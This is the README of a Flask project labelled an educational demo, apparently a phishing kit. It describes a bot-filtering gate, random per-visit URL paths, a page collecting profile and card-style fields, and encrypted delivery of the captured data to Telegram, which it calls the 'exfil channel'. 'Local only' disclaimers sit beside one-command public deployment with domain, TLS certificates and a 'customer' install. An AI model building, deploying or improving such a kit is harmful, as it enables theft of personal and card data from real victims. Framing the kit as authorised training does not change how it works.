# Educational demo — Flask “Demo Co.” (authorized training only)

## Local machine only

**Run this project only on your own computer (localhost / private LAN for class).** Do **not** deploy it to any public hosting, PaaS, VPS, or shared platform. Teaching and demos stay **local** by design.

Synthetic **non-payment** flow: gate page → `POST /p` (seven-step `gate_engine` pipeline) → **random URL path** stored in session → **HttpOnly one-time handoff cookie** → **Bango** (`bango.html`, RTL lab UI) with profile + card-style fields. Incident rows go to **`data/incidents.db`** (SQLite).

### Project layout

| Area | Path |
|------|------|
| **Backend (Flask, APIs, env)** | `backend/*.py` — imported by root `app.py` |
| **Surface (design / theme only)** | `frontend/static/surface/` — tokens + layout CSS; entry `css/lab-theme.css` |
| **Bango UI (HTML, behavior JS)** | `frontend/static/bango.source.html` (source only) → `tools/emit_bango_jinja.py` → `frontend/templates/bango.html`; `frontend/static/js/bango-lab.js`, `frontend/static/js/` (fingerprint, behavior, etc.) |
| **Data / config at repo root** | `data/`, `.env` |

## Ethics

- **Classroom / lab / red-team exercise with written permission only.**
- Do **not** impersonate real companies or target real users.
- Rotate all keys if this folder is ever copied to a shared repo.

## Setup

```bash
cd educational_demo
python3 -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -r requirements.txt
cp .env.example .env
# edit .env — set FLASK_SECRET_KEY
python app.py               # http://127.0.0.1:5000/start
```

Open **`http://127.0.0.1:5000/start`** in a normal browser (same tab/session throughout). The gate redirects to a **new random path** each run (`/portal-…/session-…/bango`). Watch the terminal for `[DEMO REGISTER]` and inspect **`data/incidents.db`** for full signal bundles.

**Tests (from repo root):** `python -m unittest discover -s tests -p 'test_*.py' -t .`  
The `-t .` option keeps imports like `from backend import …` and the `tests` package loading order correct.

## Docker & server (optional)

Use this when you want **Nginx + Gunicorn + Postgres + Redis + Let’s Encrypt (Cloudflare DNS-01)** on a server. **`install.sh` installs Docker automatically** if it is not present (get.docker.com, Ubuntu 20.04/22.04), then asks for domain, email, and Cloudflare API token, writes `.env` and `secrets/cf.ini`, issues certificates, and starts the stack. See `docker-compose.yml`, `install.sh`, and `update.sh` for details.

**One command — clone the repo, make scripts executable, run the installer** (on a new machine with `git` and `sudo`):

```bash
git clone https://github.com/nobodycp/educational_demo.git && cd educational_demo && chmod +x install.sh update.sh deploy/render-nginx.sh && ./install.sh
```

**Do not** run `git clone` again inside the project folder (you would get `educational_demo/educational_demo` and duplicate trees). If you need Bango PII decrypt on the server, run `./gen_keys.sh` locally, then place **`private_demo.pem` in `keys_only/`** on the server (that file is not in git). See `keys_only/README.txt`.

**If the repo is already on the server** (e.g. you copied the folder):

```bash
cd educational_demo
chmod +x install.sh update.sh deploy/render-nginx.sh
./install.sh
```

**Update code, rebuild, migrate Django, restart containers** (after the first install):

```bash
cd educational_demo
./update.sh
```

**Notes:**

- `install.sh` can also run `apt-get` to install **`gettext-base`** (for `envsubst`) and may add your user to the `docker` group in its messages — follow those hints if `docker` needs `sudo` until re-login.
- Do **not** commit `.env` or `secrets/cf.ini`; they are in `.gitignore`. Copy from `.env.example` and `secrets/cf.example.ini` if you set up by hand.
- Optional: `deploy/bango-lab.service` is a template **systemd** unit; edit `WorkingDirectory` then `sudo systemctl enable --now bango-lab.service`.
- **Port 80/443 already in use** (e.g. **aaPanel** / system Nginx / Apache): add to `.env` e.g. `HTTP_PUBLISH=8080` and `HTTPS_PUBLISH=8443`, then `docker compose up -d nginx`. Point the panel’s reverse proxy to `127.0.0.1:8080` and `127.0.0.1:8443` (or only HTTPS upstream). Let’s Encrypt here uses **DNS-01 (Cloudflare)**, so binding 80/443 on the host is not required for certificate issuance.
- **Full reset on the server (wipe this project’s Docker data and reinstall):** if you have nested `educational_demo` folders, **work only in one** directory (e.g. move/rename the others or delete the duplicate clones). `cd` to **that** directory first — the path is wherever *you* cloned the repo (often `~/educational_demo`); it is **not** a literal string like `/path/to/...`.
  From the single repo root:
  1. `chmod +x deploy/teardown.sh && ./deploy/teardown.sh` — stops containers, removes **named volumes** (Postgres, Redis, certbot, etc.), and optionally removes `.env`, `secrets/cf.ini`, `nginx/resolved/default.conf`, `data/incidents.db`. To skip only the first confirmation (e.g. scripts): `FORCE_TEARDOWN=1 ./deploy/teardown.sh` (you are still asked about deleting local config files).
  2. `git pull` (or a fresh `git clone` to a new empty folder and `cd` into it).
  3. `./install.sh` again.  
  **For a “customer” install:** one clone path, one `.env` with correct `HTTP_PUBLISH`/`HTTPS_PUBLISH` if 80/443 are taken, Cloudflare API token in `secrets/cf.ini` (from the installer), and optional `private_demo.pem` in `keys_only/` for Bango PII. Avoid hand-editing on the server after that — use `git pull` + `./update.sh` for new releases.

### Instructor checklist (before class)

1. **`cp .env.example .env`** and set at least **`FLASK_SECRET_KEY`**.
2. **`pip install -r requirements.txt`** inside a venv.
3. Run **`python app.py`** — open only **`127.0.0.1`** (see “Local machine only” above).
4. **Optional:** set `DEMO_GATE_HMAC_SECRET` in `.env` to demo signed gate payloads (secret is injected into `gate.html` — discuss why this is weak in production). Prefer leaving it empty and teaching **CSRF + PoW + optional Origin** instead.
5. **HTTP vs HTTPS:** `secure` cookies apply only when the site is served over HTTPS; on plain `http://127.0.0.1` leave **`DEMO_COOKIE_SECURE` unset** so the session cookie is not marked Secure-only.

### Modern-style defenses (simulation)

The lab layers common **browser-facing** controls (not a substitute for WAF, CAPTCHA, or bot management):

| Control | What it does |
|--------|--------------|
| **Gate CSRF** | `/start` stores a token in the session; `POST /p` must echo it in JSON (`csrf`). |
| **Proof-of-work** | Browser finds `pow_nonce` so `SHA-256(powId + nonce)` has `DEMO_POW_LEADING_ZEROS_HEX` leading **hex** zero digits (default 4). Raises cost for naive scripts. |
| **API CSRF** | After the handoff, `GET /api/demo/csrf` returns a token; `POST /api/demo/register` requires header **`X-CSRF-Token`**. |
| **Strict Origin (optional)** | If `DEMO_STRICT_ORIGIN=true`, JSON POSTs must include `Origin` or `Referer` whose host matches `request.host` (teaches same-site expectations; `curl` must send `-H "Origin: http://127.0.0.1:5000"`). |
| **Security headers** | `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy` on responses. |
| **Session cookies** | Flask session defaults to **HttpOnly** + **SameSite** from `DEMO_SESSION_SAMESITE` (default **Strict**). |

Disable PoW/CSRF only for scripted checks: see `.env.example` (`DEMO_POW_LEADING_ZEROS_HEX=0`, `DEMO_GATE_CSRF_DISABLED`, `DEMO_API_CSRF_DISABLED`).

**API smoke test (curl):** after `POST /p`, you must **`curl -c` (save cookies) on the `GET …/bango` response** too, or the Flask session that marks `core_verified` is lost — browsers do this automatically.

### Troubleshooting: gate shows `Blocked or error: {}`

Usually **`POST /p` did not hit Flask** (response was HTML, not JSON). Common causes:

- Opening **`file://`** or a saved copy of `gate.html` — use **`http://127.0.0.1:5000/start`** only.
- Another stack (e.g. **Apache + PHP**) answering **`/p`** on the same host/port — run the lab on **`127.0.0.1:5000`** with `python app.py` and use that URL.
- Flask not running — start from `educational_demo` after `pip install`.

The gate page now prints **HTTP status + response snippet** when something fails so you can see HTML vs JSON.

## Optional HMAC on `/p`

If `DEMO_GATE_HMAC_SECRET` is set in `.env`, the gate page signs the JSON body (see `frontend/templates/gate.html`). **Teaching point:** embedding the secret in client-side JS is weak; production signing should be server-side or use short-lived tokens. The **CSRF + PoW** path models a more realistic split: secrets stay on the server; the browser only solves a challenge and replays a session-bound token.

### Bango: PII encrypted on the wire (browser → server)

Bango no longer places names, email, or card data in the clear JSON of ``POST /api/demo/register``. ``bango-crypto.js`` loads ``/static/keys/public.pem`` and sends a single line ``encrypted_pii: "1.…"`` (RSA-2048 OAEP-SHA-256 + AES-256-GCM) matching ``backend/rsa_envelope.py``. The server decrypts with ``keys_only/private_demo.pem`` (optional override: ``DEMO_BANGO_PII_DECRYPT_PEM``). Telegram receives the **same encrypted PII envelope** as the browser (no cleartext names/cards in the chat). Decode with ``keys_only/private_demo.pem`` and ``python tools/decrypt_telegram_pii.py '1.…'``. For local debugging only, you can set ``DEMO_TELEGRAM_PII_PLAINTEXT=1`` in ``.env`` to send readable PII in Telegram (**not recommended**).

## Compare to the PHP project

| Idea | PHP reference | This lab |
|------|-----------------|----------|
| Gate entry | `start.php` + `assets/gate/app.js` | `/start` + gate template |
| Gate API | `proc.php` | `POST /p` |
| Random entry URL | `gate_build_redirect_url()` | `build_random_app_path()` + session binding |
| Handoff cookie | `gate_bind_session` / `auth_guard.php` | `edu_demo_handoff` + SHA-256 check |
| Enrollment shell | `index.html` | `bango.html` |
| Exfil channel | Telegram in `post.php` | Server log + optional `DEMO_WEBHOOK_URL` + optional Telegram |
